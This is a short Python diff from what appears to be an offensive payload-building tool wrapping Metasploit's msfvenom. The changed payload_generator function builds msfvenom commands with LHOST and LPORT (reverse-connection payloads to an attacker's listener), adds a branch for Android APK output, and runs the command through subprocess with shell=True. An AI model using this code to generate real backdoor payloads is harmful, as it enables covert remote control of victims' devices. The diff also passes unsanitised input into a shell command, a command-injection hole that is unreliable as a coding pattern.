@@ -366,7 +366,10 @@ def payload_handler():
 
 
 def payload_generator(ip, port, payload, filename, file_format):
-    generate_cmd = 'msfvenom -p {} LHOST={} LPORT={} -f {} > {}'.format(payload, ip, port, file_format, filename)
+    if file_format == 'apk':
+        generate_cmd= 'msfvenom -p {} LHOST={} LPORT={} -o {}'.format(payload, ip, port, filename)
+    else:
+        generate_cmd = 'msfvenom -p {} LHOST={} LPORT={} -f {} > {}'.format(payload, ip, port, file_format, filename)
     print("\033[1;32mGenerating Payload....")
     subprocess.call(generate_cmd, shell=True)
     pwd=subprocess.check_output('pwd', shell=True)
